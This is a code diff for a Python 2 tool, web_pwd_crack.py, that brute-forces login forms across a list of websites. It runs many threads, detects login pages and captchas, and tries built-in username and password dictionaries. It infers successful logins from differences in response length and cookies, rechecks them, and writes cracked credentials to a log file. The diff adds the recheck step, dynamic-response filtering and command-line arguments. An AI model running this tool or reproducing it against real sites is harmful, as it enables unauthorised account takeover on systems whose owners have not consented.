@@ -16,26 +16,16 @@ try:
 except:
     print 'pip install requests[security]'
     os._exit(0)
-try:
-    import lxml
-except:
-    print 'pip install lxml'
-    os._exit(0)
-
 
 reload(sys)
 sys.setdefaultencoding( "utf-8" )
 
-# Ignore warning
 requests.packages.urllib3.disable_warnings()
-# Ignore ssl warning info.
 try:
     _create_unverified_https_context = ssl._create_unverified_context
 except AttributeError:
-    # Legacy Python that doesn't verify HTTPS certificates by default
     pass
 else:
-    # Handle target environment that doesn't support HTTPS verification
     ssl._create_default_https_context = _create_unverified_https_context
 
 lock = threading.Lock()
@@ -45,9 +35,8 @@ def requests_proxies():
     Proxies for every requests
     '''
     proxies = {
-    #'http':'',#127.0.0.1:1080 shadowsocks
-    #'http':'127.0.0.1:8081',
-    #'https':'127.0.0.1:8081'#127.0.0.1:8080 BurpSuite
+    #'http':'127.0.0.1:8080',
+    #'https':'127.0.0.1:8080'
     }
     return proxies
 def requests_headers():
@@ -110,7 +99,7 @@ class WorkManager:  # 线程池管理,创建
     def wait_for_complete(self):
         while len(self.workers):
             worker = self.workers.pop()  # 从池中取出一个线程处理请求
-            worker.join()
+            worker.join(120)
             if worker.isAlive() and not self.workQueue.empty():
                 self.workers.append(worker)  # 重新加入线程池中
 
@@ -208,9 +197,11 @@ def get_form_title(url):
     yzms = ['验证码','点击更换','点击刷新']
     for yzm in yzms:
         if yzm in str(html):
-            print "\n\033[1;31m[ ",yzm,"in source:",url,']\033[0m\n'
+            print "\n\033[1;31m[ ",yzm,"in source:",url,']\033[0m\n',time.strftime('%Y-%m-%d %X', time.localtime(time.time()))
             lock.acquire()
+            log = open(log_file,'a+')
             log.write("??? "+yzm+" in source: "+url+'\n')
+            log.close()
             lock.release()
             return '',''
     try:
@@ -232,7 +223,7 @@ def get_form_title(url):
         # print type(form_content)
     # print form_content
     return form_content,title
-
+    
 
 def get_data(url,content):
     # print content
@@ -245,10 +236,7 @@ def get_data(url,content):
             canshu = x['name']
         elif x.has_attr('id'):
             canshu = x['id']
-        # elif x.has_attr('type'):
-        #     canshu = x['type']
-        # elif x.has_attr('class'):
-        #     canshu = x['class']
+        
         else:
             canshu = ''
 
@@ -265,7 +253,7 @@ def get_data(url,content):
                 if y in canshu.lower():
                     value = '{pass_word}'
 
-            for a in ['checkcode','valicode','code']:
+            for a in ['checkcode','valicode','code','captcha']:
                 if canshu.lower() in a:
                     print canshu
                     yzm = 1
@@ -274,21 +262,25 @@ def get_data(url,content):
                 if canshu.lower() == b:
                     print "\n\033[1;31m[ phpmyadmin possible:",url,']\033[0m\n'
                     lock.acquire()
+                    log = open(log_file,'a+')
                     log.write("??? phpmyadmin possible::"+url+'\n')
+                    log.close()
                     lock.release()
                     return ""
             data[canshu]=str(value)
 
     if yzm:
-        print "\n\033[1;31m[ Maybe yzm in url:",url,']\033[0m\n'
+        print "\n\033[1;31m[ Maybe yzm in url:",url,']\033[0m\n',time.strftime('%Y-%m-%d %X', time.localtime(time.time()))
         lock.acquire()
+        log = open(log_file,'a+')
         log.write("??? Maybe yzm in url:"+url+'\n')
+        log.close()
         lock.release()
         return ""
     else:
         return urllib.urlencode(data)
 
-def get_post_get_page(content):
+def get_post_get_page(content,url):
     form_action = str(content).split('\n')[0]
     # print form_action
     soup = BS(form_action, "lxml")
@@ -312,30 +304,60 @@ def get_error_length(conn,method,path,data):
     data1 = data
     # print data1
     cookie_error_flag = 0
+    dynamic_req_len = 0
     data2 = str(data1.replace('%7Buser_name%7D', 'admin'))
     data2 = str(data2.replace('%7Bpass_word%7D', 'length_test'))
-    if method.lower() == 'get':
-        # path = path+'?'+data2
-        # print path
-        res = conn.get(path, headers=requests_headers(), allow_redirects=False,timeout=10)
-        error_length = len(res.content+str(res.headers))
-        if 'Set-Cookie' in res.headers:
-            cookie_error_flag = 1
-        return error_length,cookie_error_flag
-    if method.lower() == 'post':
-        # print path
-        res = conn.post(url = path,data = data2, headers=requests_headers(), timeout=10,verify=False,allow_redirects=False,proxies = requests_proxies())
-        error_length = len(res.content+str(res.headers))
-        if 'Set-Cookie' in res.headers:
-            cookie_error_flag = 1
-        return error_length,cookie_error_flag
+
+    res_01 = conn.post(url = path,data = data2, headers=requests_headers(), timeout=10,verify=False,allow_redirects=False,proxies = requests_proxies())
+    res_02 = conn.post(url = path,data = data2, headers=requests_headers(), timeout=10,verify=False,allow_redirects=False,proxies = requests_proxies())
+    res = conn.post(url = path,data = data2, headers=requests_headers(), timeout=10,verify=False,allow_redirects=False,proxies = requests_proxies())
+    error_length_02 = len(res_02.content+str(res_02.headers))
+    error_length = len(res.content+str(res.headers))
+    if error_length_02 != error_length:
+        dynamic_req_len = 1
+    if 'Set-Cookie' in res.headers:
+        cookie_error_flag = 1
+    return error_length,cookie_error_flag,dynamic_req_len
+
+def recheck(method,path,data,user_name,pass_word):
+    data1 = data
+    conn =  requests.session()
+    pass_word = str(pass_word.replace('{user}', user_name))
+
+    data_test = str(data1.replace('%7Buser_name%7D', user_name))
+    data_test = str(data_test.replace('%7Bpass_word%7D', 'length_test'))
+
+    data2 = str(data1.replace('%7Buser_name%7D', user_name))
+    data2 = str(data2.replace('%7Bpass_word%7D', pass_word))
+
+    res_01 = conn.post(url = path,data = data_test, headers=requests_headers(), timeout=10,verify=False,allow_redirects=False,proxies = requests_proxies())
+    res_01 = conn.post(url = path,data = data_test, headers=requests_headers(), timeout=10,verify=False,allow_redirects=False,proxies = requests_proxies())
+    res_01 = conn.post(url = path,data = data_test, headers=requests_headers(), timeout=10,verify=False,allow_redirects=False,proxies = requests_proxies())
+    res_01 = conn.post(url = path,data = data_test, headers=requests_headers(), timeout=10,verify=False,allow_redirects=False,proxies = requests_proxies())
+    res_01 = conn.post(url = path,data = data_test, headers=requests_headers(), timeout=10,verify=False,allow_redirects=False,proxies = requests_proxies())
+    res_02 = conn.post(url = path,data = data2, headers=requests_headers(), timeout=10,verify=False,allow_redirects=False,proxies = requests_proxies())
+
+    error_length_01 = len(res_01.content+str(res_01.headers))
+    error_length_02 = len(res_02.content+str(res_02.headers))
+
+    if ">CONN" in str(res_01.headers):
+        error_length_01 = error_length_01 -5
+    if ">CONN" in str(res_02.headers):
+        error_length_02 = error_length_02 -5
+
+    if error_length_01 == error_length_02:
+        return 0
+    else:
+        return 1
 
 
 def web_crack(method,path,data):
     # try:
     conn =  requests.session()
     res0 = conn.get(path, headers=requests_headers(), allow_redirects=False,timeout=10,proxies = requests_proxies())
-    error_length,cookie_error_flag = get_error_length(conn,method,path,data)
+    error_length,cookie_error_flag,dynamic_req_len = get_error_length(conn,method,path,data)
+    if dynamic_req_len:
+        return False,False
 
     num = 0
     success_flag = 0
@@ -354,37 +376,17 @@ def web_crack(method,path,data):
             # print "字典总数：",dic_all," 当前尝试：",num," checking:",user_name,pass_word
             # print "url:",path,"  data:",urllib.unquote(data2)
 
-            if method.lower() == 'get':
-                # path = path+'?'+data2
-                # print path
-                res = conn.get(path, headers=requests_headers(), allow_redirects=False,timeout=10)
-                cur_length = len(res.content+str(res.headers))
-                # print "Get  error_length:",error_length, " cur_length:",cur_length," cookie_error_flag:",cookie_error_flag
-                if cookie_error_flag:  # cookie_error_flag表示每个数据包中都有cookie
-                    if cur_length!=error_length:
-                        success_flag =1
-                        return user_name,pass_word
-                elif 'Set-Cookie' in res.headers and cur_length!=error_length:
-                    # print  "ok"
-                    success_flag =1
+            res = conn.post(url = path,data = data2, headers=requests_headers(), timeout=10,verify=False,allow_redirects=False,proxies = requests_proxies())
+            cur_length = len(res.content+str(res.headers))
 
-                    return user_name,pass_word
-
-            if method.lower() == 'post':
-                # print path
-                res = conn.post(url = path,data = data2, headers=requests_headers(), timeout=10,verify=False,allow_redirects=False,proxies = requests_proxies())
-                cur_length = len(res.content+str(res.headers))
-                # print "Post  error_length:",error_length, " cur_length:",cur_length," cookie_error_flag:",cookie_error_flag
-                # print res.status_code
-                # print res.headers
-                if cookie_error_flag:  # cookie_error_flag表示每个数据包中都有cookie
-                    if cur_length!=error_length:
-                        success_flag =1
-                        return user_name,pass_word
-                elif 'Set-Cookie' in res.headers and cur_length!=error_length:
-                    # print  "ok"
+            if cookie_error_flag:  # cookie_error_flag表示每个数据包中都有cookie
+                if cur_length!=error_length:
                     success_flag =1
                     return user_name,pass_word
+            elif 'Set-Cookie' in res.headers and cur_length!=error_length:
+                # print  "ok"
+                success_flag =1
+                return user_name,pass_word
     if success_flag == 0:
         return False,False
 
@@ -394,45 +396,97 @@ def web_crack_task(url,num):
         url = url.strip()
         form_content,title = get_form_title(url)
         # print form_content
+        sous = ['检索','搜','search','查找','keyword','关键字']
+        for sou in sous:
+            if sou in str(form_content):
+                print "Maybe search pages:",url
+                form_content =''
+
+        logins =['用户名','密码','login','denglu','登录','user','pass','yonghu','mima']
+        login_flag = 0
+        if form_content:
+            for login in logins:
+                if login in str(form_content):
+                    login_flag = 1
+
+            if login_flag == 0:
+                print "Mayme not login pages:",url
+                form_content =''
+
         if form_content:
             data = get_data(url,form_content)
-            # print data
+
             if data:
                 print "Checking :",url," All_num:",url_all,"Current_num:",num," ",time.strftime('%Y-%m-%d %X', time.localtime(time.time()))
-                path,method = get_post_get_page(form_content)
+                path,method = get_post_get_page(form_content,url)
                 user_name,pass_word = web_crack(method,path,data)
+                recheck_flag = 1
                 if user_name or pass_word:
+                    print user_name,pass_word
+                    recheck_flag = recheck(method,path,data,user_name,pass_word)
+                else:
+                    recheck_flag = 0
+
+                if recheck_flag:
                     lock.acquire()
+                    log = open(log_file,'a+')
                     log.write("!!! Success url:"+url+'\t'+user_name+'/'+pass_word+'\n')
-                    oklog.write("!!! Success url:"+url+'\t'+user_name+'/'+pass_word+'\n')
+                    log.close()
+                    oklog=open(oklog_file,'a+')
+                    oklog.write(url+'\t'+user_name+'/'+pass_word+'\n')
+                    oklog.close()
                     lock.release()
                     print "\n\033[1;32m[ Success url:",url," user/pass",user_name,pass_word,']\033[0m\n'
                 else:
-                    print "\n\033[1;31m[ Faild url:",url,']\033[0m\n'
+                    print "\n\033[1;31m[ Faild url:",url,']\033[0m\n',time.strftime('%Y-%m-%d %X', time.localtime(time.time()))
     except Exception as e:
         start = datetime.datetime.now()
         error_log.write(str(start)+str(e)+'\n')
         print start,e
 
 
-USERNAME_DIC = ['admin','guest','test','system','ceshi']
-PASSWORD_DIC = ['123456','admin','password','123123','123','1','{user}','{user}{user}','{user}1','{user}123','{user}2018','{user}2017','{user}2016','{user}2015','{user}!','','P@ssw0rd!!','qwa123','12345678','test','123qwe!@#','123456789','123321','1314520','666666','woaini','000000','1234567890','8888888','qwerty','1qaz2wsx','abc123','abc123456','1q2w3e4r','123qwe','a123456','p@ssw0rd','a123456789','woaini1314','qwerasdf','123456a','123456789a','987654321','qwer!@#$','5201314520', 'q123456', '123456abc', '123123123', '123456.','0123456789', 'asd123456', 'aa123456', 'q123456789', '!QAZ@WSX','12345','1234567','passw0rd','admin888']
+USERNAME_DIC = ['admin','guest','test','ceshi','system']
+PASSWORD_DIC = ['123456','admin','password','123123','123','1','{user}','{user}{user}','{user}1','{user}123','{user}2018','{user}2017','{user}2016','{user}2015','{user}!','P@ssw0rd!!','qwa123','12345678','test','123qwe!@#','123456789','123321','1314520','666666','woaini','000000','1234567890','8888888','qwerty','1qaz2wsx','abc123','abc123456','1q2w3e4r','123qwe','a123456','p@ssw0rd','a123456789','woaini1314','qwerasdf','123456a','123456789a','987654321','qwer!@#$','5201314520', 'q123456', '123456abc', '123123123', '123456.','0123456789', 'asd123456', 'aa123456', 'q123456789', '!QAZ@WSX','12345','1234567','passw0rd','admin888']
 
 # USERNAME_DIC = ['admin']
-# PASSWORD_DIC = ['123456','admin','111111']
+# PASSWORD_DIC = ['123456','admin','111111','password','123123','123','1','{user}','{user}{user}','{user}1','{user}123']
 
-log = open('web_crack_log.txt','a+')
+log_file = 'web_crack_log.txt'
 
-oklog = open('web_crack_ok.txt','a+')
+oklog_file = 'web_crack_ok.txt'
 
 error_log = open('web_crack_error.txt','a+')
 
 
 if __name__ == "__main__":
+
+    url_file_name =''
+    thread_num = 50
+
+    usage = '''
+    Usage:
+    python web_pwd_crack.py url.txt 50   --> url.txt为待扫描URL地址列表,50为线程数，默认为50
+        '''
+
+    if len(sys.argv) ==2:
+        url_file_name = sys.argv[1]
+        thread_num = 50
+    elif len(sys.argv) ==3:
+        url_file_name = sys.argv[1]
+        thread_num = int(sys.argv[2])
+    else:
+        print usage
+        exit(0)
+
     now = time.strftime('%Y-%m-%d %X', time.localtime(time.time()))
     try:
         urllist = []
-        url_file = open('result_url_01.txt','r')
+        if os.path.exists(url_file_name):
+            url_file = open(url_file_name,'r')
+        else:
+            print url_file_name+" not exist!"
+            exit(0)
+
         for u in url_file.readlines():
             u = u.strip()
             urllist.append(u)
@@ -440,23 +494,27 @@ if __name__ == "__main__":
         cur_num = 0
         print url_all
         times_num = 1
+        finish_flag=0
 
-        while (50*times_num < url_all):
-            wm = WorkManager(50)
-            for num in range(50*(times_num-1),50*times_num):
-                print "url_all:",url_all," current_num:",num," current_url:",urllist[num]
-                url =urllist[num].strip()
-                wm.add_job(web_crack_task, url,num)
+        while (finish_flag != 1 ):
+            wm = WorkManager(thread_num)
+            for num in range(thread_num*(times_num-1),thread_num*times_num):  #thread_num*(times_num-1),thread_num*times_num
+                if num >=  url_all:
+                    finish_flag =1
+                    break
+                else:
+                    # print "\n",num,"\n"
+                    print "url_all:",url_all," current_num:",num," current_url:",urllist[num]
+                    url =urllist[num].strip()
+                    # web_crack_task(url,num)
+                    wm.add_job(web_crack_task, url,num)
             wm.start()
             wm.wait_for_complete()
-
             times_num = times_num+1
+
     except Exception as e:
         start = datetime.datetime.now()
         error_log.write(str(start)+str(e)+'\n')
         print start,e
 
 
-    # except  Exception, e:
-    #     info = '\033[1;35m[!]%s\n Main_function Error: %s\033[0m!' % (now, e)
-    #     print info
